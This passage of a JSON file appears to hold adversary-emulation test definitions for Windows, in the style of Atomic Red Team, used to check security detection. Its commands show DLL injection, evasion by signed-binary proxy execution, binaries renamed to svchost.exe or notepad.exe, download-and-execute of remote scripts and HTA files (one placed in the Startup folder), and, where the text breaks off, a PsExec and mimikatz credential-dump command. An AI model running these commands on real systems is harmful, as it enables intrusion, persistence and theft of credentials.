"input_arguments": [], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["mavinject.exe #{process_id} /INJECTRUNNING #{dll_payload}\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "mavinject - Inject DLL into running process", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path #{dll_payload}) {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "process_id", "value": "1000"}, {"key": "dll_payload", "value": "PathToAtomicsFolder\\\\T1218\\\\src\\\\x64\\\\T1218.dll"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["SyncAppvPublishingServer.exe \\"n; #{powershell_code}\\"\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "SyncAppvPublishingServer - Execute arbitrary PowerShell code", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [{"key": "powershell_code", "value": "Start-Process calc.exe"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["C:\\\\Windows\\\\SysWow64\\\\Register-CimProvider.exe -Path #{dll_payload}\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Register-CimProvider - Execute evil dll", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path #{dll_payload}) {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "dll_payload", "value": "PathToAtomicsFolder\\\\T1218\\\\src\\\\Win32\\\\T1218-2.dll"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["InfDefaultInstall.exe #{inf_to_execute}\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "InfDefaultInstall.exe .inf Execution", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path #{inf_to_execute}) {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "inf_to_execute", "value": "PathToAtomicsFolder\\\\T1218\\\\src\\\\Infdefaultinstall.inf"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["FOR /F \\"tokens=2*\\" %a in ('reg query \\"HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\App Paths\\\\Winword.exe\\" /V PATH') do set microsoft_wordpath=%b\\ncall \\"%microsoft_wordpath%\\\\protocolhandler.exe\\" \\"ms-word:nft|u|#{remote_url}\\"\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "ProtocolHandler.exe Downloaded a Suspicious File", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path \\"(Resolve-Path \\"C:\\\\Program Files*\\\\Microsoft Office\\\\root\\\\Office16\\")\\\\protocolhandler.exe\\") {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "remote_url", "value": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218/src/T1218Test.docx"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["#{mwcpath}\\\\#{mwcname} \\"#{xml_payload}\\" output.txt\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Microsoft.Workflow.Compiler.exe Payload Execution", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path #{mwcpath}\\\\#{mwcname} ) {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "xml_payload", "value": "PathToAtomicsFolder\\\\T1218\\\\src\\\\T1218.xml"}, {"key": "mwcpath", "value": "C:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\v4.0.30319"}, {"key": "mwcname", "value": "microsoft.workflow.compiler.exe"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["#{renamed_binary} #{xml_payload} output.txt\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Renamed Microsoft.Workflow.Compiler.exe Payload Executions", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["Copy-Item #{mwcpath}\\\\#{mwcname} \\"#{renamed_binary}\\" -Force\\nif (Test-Path \\"#{renamed_binary}\\") {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "xml_payload", "value": "PathToAtomicsFolder\\\\T1218\\\\src\\\\T1218.xml"}, {"key": "renamed_binary", "value": "PathToAtomicsFolder\\\\T1218\\\\src\\\\svchost.exe"}, {"key": "mwcpath", "value": "C:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\v4.0.30319"}, {"key": "mwcname", "value": "microsoft.workflow.compiler.exe"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["Invoke-ATHRemoteFXvGPUDisablementCommand -ModuleName #{module_name} -ModulePath #{module_path}"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Invoke-ATHRemoteFXvGPUDisablementCommand base test", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\\nif (-not $RequiredModule) {exit 1}\\nif (-not $RequiredModule.ExportedCommands['Invoke-ATHRemoteFXvGPUDisablementCommand']) {exit 1} else {exit 0}"], "input_arguments": [{"key": "module_name", "value": "foo"}, {"key": "module_path", "value": "$PWD"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["control.exe #{cpl_file_path}\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Control Panel Items", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path #{cpl_file_path}) {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "cpl_file_path", "value": "PathToAtomicsFolder\\\\T1218.002\\\\bin\\\\calc.cpl"}], "execution_status": "Pass"}, {"cleanup": "$InstallerAssemblyDir = \\"#{assembly_dir}\\"\\n$InstallerAssemblyFileName = \\"#{assembly_filename}\\"\\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\\nRemove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore\\n", "command": ["# Import the required test harness function", " Invoke-BuildAndInvokeInstallUtilAssembly\\n. #{test_harness}\\n\\n$InstallerAssemblyDir = \\"#{assembly_dir}\\"\\n$InstallerAssemblyFileName = \\"#{assembly_filename}\\"\\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\\n\\n$ExpectedOutput = 'Constructor_'\\n\\n$TestArgs = @{\\n    OutputAssemblyDirectory = $InstallerAssemblyDir\\n    OutputAssemblyFileName = $InstallerAssemblyFileName\\n    InvocationMethod = '#{invocation_method}'\\n}\\n\\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly\\n\\nif ($ActualOutput -ne $ExpectedOutput) {\\n    throw @\\"\\nCheckIfInstallable method execution test failure. Installer assembly execution output did not match the expected output.\\nExpected: $ExpectedOutput\\nActual: $ActualOutput\\n\\"@\\n}\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "CheckIfInstallable method call", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path \\"#{test_harness}\\") {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "test_harness", "value": "PathToAtomicsFolder\\\\T1218.004\\\\src\\\\InstallUtilTestHarness.ps1"}, {"key": "assembly_dir", "value": "$Env:TEMP\\\\"}, {"key": "invocation_method", "value": "CheckIfInstallable"}, {"key": "assembly_filename", "value": "T1218.004.dll"}], "execution_status": "Pass"}, {"cleanup": "$InstallerAssemblyDir = \\"#{assembly_dir}\\"\\n$InstallerAssemblyFileName = \\"#{assembly_filename}\\"\\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\\nRemove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore\\n", "command": ["# Import the required test harness function", " Invoke-BuildAndInvokeInstallUtilAssembly\\n. #{test_harness}\\n\\n$InstallerAssemblyDir = \\"#{assembly_dir}\\"\\n$InstallerAssemblyFileName = \\"#{assembly_filename}\\"\\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\\n\\n$CommandLine = \\"/logfile= /logtoconsole=false `\\"$InstallerAssemblyFullPath`\\"\\"\\n$ExpectedOutput = 'Constructor_'\\n\\n$TestArgs = @{\\n    OutputAssemblyDirectory = $InstallerAssemblyDir\\n    OutputAssemblyFileName = $InstallerAssemblyFileName\\n    InvocationMethod = '#{invocation_method}'\\n    CommandLine = $CommandLine\\n}\\n\\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly\\n\\nif ($ActualOutput -ne $ExpectedOutput) {\\n    throw @\\"\\nInstallHelper method execution test failure. Installer assembly execution output did not match the expected output.\\nExpected: $ExpectedOutput\\nActual: $ActualOutput\\n\\"@\\n}\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "InstallHelper method call", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path \\"#{test_harness}\\") {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "test_harness", "value": "PathToAtomicsFolder\\\\T1218.004\\\\src\\\\InstallUtilTestHarness.ps1"}, {"key": "assembly_dir", "value": "$Env:TEMP\\\\"}, {"key": "invocation_method", "value": "InstallHelper"}, {"key": "assembly_filename", "value": "T1218.004.dll"}], "execution_status": "Pass"}, {"cleanup": "$InstallerAssemblyDir = \\"#{assembly_dir}\\"\\n$InstallerAssemblyFileName = \\"#{assembly_filename}\\"\\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\\nRemove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore\\n", "command": ["# Import the required test harness function", " Invoke-BuildAndInvokeInstallUtilAssembly\\n. #{test_harness}\\n\\n$InstallerAssemblyDir = \\"#{assembly_dir}\\"\\n$InstallerAssemblyFileName = \\"#{assembly_filename}\\"\\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\\n\\n$CommandLine = \\"/logfile= /logtoconsole=false `\\"$InstallerAssemblyFullPath`\\"\\"\\n$ExpectedOutput = 'Constructor_'\\n\\n$TestArgs = @{\\n    OutputAssemblyDirectory = $InstallerAssemblyDir\\n    OutputAssemblyFileName = $InstallerAssemblyFileName\\n    InvocationMethod = '#{invocation_method}'\\n    CommandLine = $CommandLine\\n}\\n\\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly\\n\\nif ($ActualOutput -ne $ExpectedOutput) {\\n    throw @\\"\\nInstallUtil class constructor execution test failure. Installer assembly execution output did not match the expected output.\\nExpected: $ExpectedOutput\\nActual: $ActualOutput\\n\\"@\\n}\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "InstallUtil class constructor method call", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path \\"#{test_harness}\\") {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "test_harness", "value": "PathToAtomicsFolder\\\\T1218.004\\\\src\\\\InstallUtilTestHarness.ps1"}, {"key": "assembly_dir", "value": "$Env:TEMP\\\\"}, {"key": "invocation_method", "value": "Executable"}, {"key": "assembly_filename", "value": "T1218.004.dll"}], "execution_status": "Pass"}, {"cleanup": "$InstallerAssemblyDir = \\"#{assembly_dir}\\"\\n$InstallerAssemblyFileName = \\"#{assembly_filename}\\"\\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\\nRemove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore\\n", "command": ["# Import the required test harness function", " Invoke-BuildAndInvokeInstallUtilAssembly\\n. #{test_harness}\\n\\n$InstallerAssemblyDir = \\"#{assembly_dir}\\"\\n$InstallerAssemblyFileName = \\"#{assembly_filename}\\"\\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\\n\\n$CommandLine = \\"/logfile= /logtoconsole=false /installtype=notransaction /action=install `\\"$InstallerAssemblyFullPath`\\"\\"\\n$ExpectedOutput = 'Constructor_Install_'\\n\\n$TestArgs = @{\\n    OutputAssemblyDirectory = $InstallerAssemblyDir\\n    OutputAssemblyFileName = $InstallerAssemblyFileName\\n    InvocationMethod = '#{invocation_method}'\\n    CommandLine = $CommandLine\\n}\\n\\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs\\n\\nif ($ActualOutput -ne $ExpectedOutput) {\\n    throw @\\"\\nInstallUtil Install method execution test failure. Installer assembly execution output did not match the expected output.\\nExpected: $ExpectedOutput\\nActual: $ActualOutput\\n\\"@\\n}\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "InstallUtil Install method call", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path \\"#{test_harness}\\") {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "test_harness", "value": "PathToAtomicsFolder\\\\T1218.004\\\\src\\\\InstallUtilTestHarness.ps1"}, {"key": "assembly_dir", "value": "$Env:TEMP\\\\"}, {"key": "invocation_method", "value": "Executable"}, {"key": "assembly_filename", "value": "T1218.004.dll"}], "execution_status": "Pass"}, {"cleanup": "$InstallerAssemblyDir = \\"#{assembly_dir}\\"\\n$InstallerAssemblyFileName = \\"#{assembly_filename}\\"\\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\\nRemove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore\\n", "command": ["# Import the required test harness function", " Invoke-BuildAndInvokeInstallUtilAssembly\\n. #{test_harness}\\n\\n$InstallerAssemblyDir = \\"#{assembly_dir}\\"\\n$InstallerAssemblyFileName = \\"#{assembly_filename}\\"\\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\\n\\n$CommandLine = \\"/logfile= /logtoconsole=false /U `\\"$InstallerAssemblyFullPath`\\"\\"\\n$ExpectedOutput = 'Constructor_Uninstall_'\\n\\n$TestArgs = @{\\n    OutputAssemblyDirectory = $InstallerAssemblyDir\\n    OutputAssemblyFileName = $InstallerAssemblyFileName\\n    InvocationMethod = '#{invocation_method}'\\n    CommandLine = $CommandLine\\n}\\n\\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs\\n\\nif ($ActualOutput -ne $ExpectedOutput) {\\n    throw @\\"\\nInstallUtil Uninstall method execution test failure. Installer assembly execution output did not match the expected output.\\nExpected: $ExpectedOutput\\nActual: $ActualOutput\\n\\"@\\n}\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "InstallUtil Uninstall method call - /U variant", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path \\"#{test_harness}\\") {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "test_harness", "value": "PathToAtomicsFolder\\\\T1218.004\\\\src\\\\InstallUtilTestHarness.ps1"}, {"key": "assembly_dir", "value": "$Env:TEMP\\\\"}, {"key": "invocation_method", "value": "Executable"}, {"key": "assembly_filename", "value": "T1218.004.dll"}], "execution_status": "Pass"}, {"cleanup": "$InstallerAssemblyDir = \\"#{assembly_dir}\\"\\n$InstallerAssemblyFileName = \\"#{assembly_filename}\\"\\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\\nRemove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore\\n", "command": ["# Import the required test harness function", " Invoke-BuildAndInvokeInstallUtilAssembly\\n. #{test_harness}\\n\\n$InstallerAssemblyDir = \\"#{assembly_dir}\\"\\n$InstallerAssemblyFileName = \\"#{assembly_filename}\\"\\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\\n\\n$CommandLine = \\"/logfile= /logtoconsole=false /installtype=notransaction /action=uninstall `\\"$InstallerAssemblyFullPath`\\"\\"\\n$ExpectedOutput = 'Constructor_Uninstall_'\\n\\n$TestArgs = @{\\n    OutputAssemblyDirectory = $InstallerAssemblyDir\\n    OutputAssemblyFileName = $InstallerAssemblyFileName\\n    InvocationMethod = '#{invocation_method}'\\n    CommandLine = $CommandLine\\n}\\n\\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs\\n\\nif ($ActualOutput -ne $ExpectedOutput) {\\n    throw @\\"\\nInstallUtil Uninstall method execution test failure. Installer assembly execution output did not match the expected output.\\nExpected: $ExpectedOutput\\nActual: $ActualOutput\\n\\"@\\n}\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "InstallUtil Uninstall method call - '/installtype=notransaction /action=uninstall' variant", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path \\"#{test_harness}\\") {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "test_harness", "value": "PathToAtomicsFolder\\\\T1218.004\\\\src\\\\InstallUtilTestHarness.ps1"}, {"key": "assembly_dir", "value": "$Env:TEMP\\\\"}, {"key": "invocation_method", "value": "Executable"}, {"key": "assembly_filename", "value": "T1218.004.dll"}], "execution_status": "Pass"}, {"cleanup": "$InstallerAssemblyDir = \\"#{assembly_dir}\\"\\n$InstallerAssemblyFileName = \\"#{assembly_filename}\\"\\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\\nRemove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore\\n", "command": ["# Import the required test harness function", " Invoke-BuildAndInvokeInstallUtilAssembly\\n. #{test_harness}\\n\\n$InstallerAssemblyDir = \\"#{assembly_dir}\\"\\n$InstallerAssemblyFileName = \\"#{assembly_filename}\\"\\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\\n\\n$CommandLine = \\"/? `\\"$InstallerAssemblyFullPath`\\"\\"\\n$ExpectedOutput = 'Constructor_HelpText_'\\n\\n$TestArgs = @{\\n    OutputAssemblyDirectory = $InstallerAssemblyDir\\n    OutputAssemblyFileName = $InstallerAssemblyFileName\\n    InvocationMethod = '#{invocation_method}'\\n    CommandLine = $CommandLine\\n}\\n\\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs\\n\\nif ($ActualOutput -ne $ExpectedOutput) {\\n    throw @\\"\\nInstallUtil HelpText property execution test failure. Installer assembly execution output did not match the expected output.\\nExpected: $ExpectedOutput\\nActual: $ActualOutput\\n\\"@\\n}\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "InstallUtil HelpText method call", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path \\"#{test_harness}\\") {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "test_harness", "value": "PathToAtomicsFolder\\\\T1218.004\\\\src\\\\InstallUtilTestHarness.ps1"}, {"key": "assembly_dir", "value": "$Env:TEMP\\\\"}, {"key": "invocation_method", "value": "Executable"}, {"key": "assembly_filename", "value": "T1218.004.dll"}], "execution_status": "Pass"}, {"cleanup": "Remove-Item -Path \\"$Env:windir\\\\System32\\\\Tasks\\\\readme.txt\\" -ErrorAction Ignore\\nRemove-Item -Path \\"$Env:windir\\\\System32\\\\Tasks\\\\readme.InstallLog\\" -ErrorAction Ignore\\nRemove-Item -Path \\"$Env:windir\\\\System32\\\\Tasks\\\\readme.InstallState\\" -ErrorAction Ignore\\nRemove-Item -Path \\"$Env:windir\\\\System32\\\\Tasks\\\\notepad.exe\\" -ErrorAction Ignore\\n", "command": ["# Import the required test harness function", " Invoke-BuildAndInvokeInstallUtilAssembly\\n. #{test_harness}\\n\\n$InstallerAssemblyDir = \\"$Env:windir\\\\System32\\\\Tasks\\"\\n$InstallerAssemblyFileName = 'readme.txt'\\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\\n\\n$CommandLine = \\"readme.txt\\"\\n$ExpectedOutput = 'Constructor_'\\n\\n# Explicitly set the directory so that a relative path to readme.txt can be supplied.\\nSet-Location \\"$Env:windir\\\\System32\\\\Tasks\\"\\n\\nCopy-Item -Path \\"$([System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory())InstallUtil.exe\\" -Destination \\"$Env:windir\\\\System32\\\\Tasks\\\\notepad.exe\\"\\n\\n$TestArgs = @{\\n    OutputAssemblyDirectory = $InstallerAssemblyDir\\n    OutputAssemblyFileName = $InstallerAssemblyFileName\\n    InvocationMethod = 'Executable'\\n    CommandLine = $CommandLine\\n    InstallUtilPath = \\"$Env:windir\\\\System32\\\\Tasks\\\\notepad.exe\\"\\n}\\n\\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly\\n\\nif ($ActualOutput -ne $ExpectedOutput) {\\n    throw @\\"\\nEvasive Installutil invocation test failure. Installer assembly execution output did not match the expected output.\\nExpected: $ExpectedOutput\\nActual: $ActualOutput\\n\\"@\\n}\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "InstallUtil evasive invocation", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path \\"#{test_harness}\\") {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "test_harness", "value": "PathToAtomicsFolder\\\\T1218.004\\\\src\\\\InstallUtilTestHarness.ps1"}], "execution_status": "Pass"}, {"cleanup": "Remove-Item -Path \\"$Env:windir\\\\System32\\\\Tasks\\\\readme.txt\\" -ErrorAction Ignore\\nRemove-Item -Path \\"$Env:windir\\\\System32\\\\Tasks\\\\readme.InstallLog\\" -ErrorAction Ignore\\nRemove-Item -Path \\"$Env:windir\\\\System32\\\\Tasks\\\\readme.InstallState\\" -ErrorAction Ignore\\nRemove-Item -Path \\"$Env:windir\\\\System32\\\\Tasks\\\\notepad.exe\\" -ErrorAction Ignore\\n", "command": ["mshta vbscript:Execute(\\"CreateObject(\\"\\"Wscript.Shell\\"\\").Run \\"\\"powershell -noexit -file PathToAtomicsFolder\\\\T1218.005\\\\src\\\\powershell.ps1\\"\\":close\\")\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Mshta executes VBScript to execute malicious command", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "remove-item \\"#{temp_file}\\" -ErrorAction Ignore\\n", "command": ["$var =Invoke-WebRequest \\"#{hta_url}\\"\\n$var.content|out-file \\"#{temp_file}\\"\\nmshta \\"#{temp_file}\\"\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Mshta Executes Remote HTML Application (HTA)", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": [], "input_arguments": [{"key": "temp_file", "value": "$env:appdata\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\T1218.005.hta"}, {"key": "hta_url", "value": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/T1218.005.hta"}], "execution_status": "Pass"}, {"cleanup": "remove-item \\"#{temp_file}\\" -ErrorAction Ignore\\n", "command": ["Invoke-ATHHTMLApplication -HTAFilePath #{hta_file_path} -ScriptEngine #{script_engine} -AsLocalUNCPath -SimulateLateralMovement -MSHTAFilePath #{mshta_file_path}"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Invoke HTML Application - Jscript Engine over Local UNC Simulating Lateral Movement", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": ["$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\\nif (-not $RequiredModule) {exit 1}\\nif (-not $RequiredModule.ExportedCommands['Invoke-ATHHTMLApplication']) {exit 1} else {exit 0}"], "input_arguments": [{"key": "script_engine", "value": "JScript"}, {"key": "hta_file_path", "value": "Test.hta"}, {"key": "mshta_file_path", "value": "$env:windir\\\\system32\\\\mshta.exe"}], "execution_status": "Pass"}, {"cleanup": "remove-item \\"#{temp_file}\\" -ErrorAction Ignore\\n", "command": ["Invoke-ATHHTMLApplication -HTAFilePath #{hta_file_path} -ScriptEngine #{script_engine} -SimulateUserDoubleClick"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Invoke HTML Application - Jscript Engine Simulating Double Click", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": ["$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\\nif (-not $RequiredModule) {exit 1}\\nif (-not $RequiredModule.ExportedCommands['Invoke-ATHHTMLApplication']) {exit 1} else {exit 0}"], "input_arguments": [{"key": "script_engine", "value": "JScript"}, {"key": "hta_file_path", "value": "Test.hta"}], "execution_status": "Pass"}, {"cleanup": "remove-item \\"#{temp_file}\\" -ErrorAction Ignore\\n", "command": ["Invoke-ATHHTMLApplication -HTAUri #{hta_uri} -MSHTAFilePath #{mshta_file_path}"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Invoke HTML Application - Direct download from URI", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": ["$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\\nif (-not $RequiredModule) {exit 1}\\nif (-not $RequiredModule.ExportedCommands['Invoke-ATHHTMLApplication']) {exit 1} else {exit 0}"], "input_arguments": [{"key": "mshta_file_path", "value": "$env:windir\\\\system32\\\\mshta.exe"}, {"key": "hta_uri", "value": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/24549e3866407c3080b95b6afebf78e8acd23352/atomics/T1218.005/src/T1218.005.hta"}], "execution_status": "Pass"}, {"cleanup": "remove-item \\"#{temp_file}\\" -ErrorAction Ignore\\n", "command": ["Invoke-ATHHTMLApplication -ScriptEngine #{script_engine} -InlineProtocolHandler #{protocol_handler} -UseRundll32 -Rundll32FilePath #{rundll32_file_path}"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Invoke HTML Application - JScript Engine with Rundll32 and Inline Protocol Handler", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": ["$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\\nif (-not $RequiredModule) {exit 1}\\nif (-not $RequiredModule.ExportedCommands['Invoke-ATHHTMLApplication']) {exit 1} else {exit 0}"], "input_arguments": [{"key": "rundll32_file_path", "value": "$env:windir\\\\system32\\\\rundll32.exe"}, {"key": "script_engine", "value": "JScript"}, {"key": "protocol_handler", "value": "About"}], "execution_status": "Pass"}, {"cleanup": "remove-item \\"#{temp_file}\\" -ErrorAction Ignore\\n", "command": ["Invoke-ATHHTMLApplication -ScriptEngine #{script_engine} -InlineProtocolHandler #{protocol_handler} -MSHTAFilePath #{mshta_file_path}"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Invoke HTML Application - JScript Engine with Inline Protocol Handler", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": ["$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\\nif (-not $RequiredModule) {exit 1}\\nif (-not $RequiredModule.ExportedCommands['Invoke-ATHHTMLApplication']) {exit 1} else {exit 0}"], "input_arguments": [{"key": "mshta_file_path", "value": "$env:windir\\\\system32\\\\mshta.exe"}, {"key": "script_engine", "value": "JScript"}, {"key": "protocol_handler", "value": "About"}], "execution_status": "Pass"}, {"cleanup": "remove-item \\"#{temp_file}\\" -ErrorAction Ignore\\n", "command": ["Invoke-ATHHTMLApplication -TemplatePE -AsLocalUNCPath -MSHTAFilePath #{mshta_file_path}"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Invoke HTML Application - Simulate Lateral Movement over UNC Path", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": ["$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\\nif (-not $RequiredModule) {exit 1}\\nif (-not $RequiredModule.ExportedCommands['Invoke-ATHHTMLApplication']) {exit 1} else {exit 0}"], "input_arguments": [{"key": "mshta_file_path", "value": "$env:windir\\\\system32\\\\mshta.exe"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["IEX (iwr \\"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\\" -UseBasicParsing)\\nInvoke-Maldoc -macroFile \\"PathToAtomicsFolder\\\\T1055\\\\src\\\\x64\\\\T1055-macrocode.txt\\" -officeProduct \\"Word\\" -sub \\"Execute\\"\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Shellcode execution via VBA", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["try {\\n  $wdApp = New-Object -COMObject \\"Word.Application\\"\\n  $path = $wdApp.Path\\n  Stop-Process -Name \\"winword\\"\\n  if ($path.contains(\\"(x86)\\")) { exit 1 } else { exit 0 }\\n} catch { exit 1 }\\n"], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["#{psexec_path} /accepteula \\\\\\\\#{machine} -c #{mimikatz_path} \\"lsadump::lsa /inject 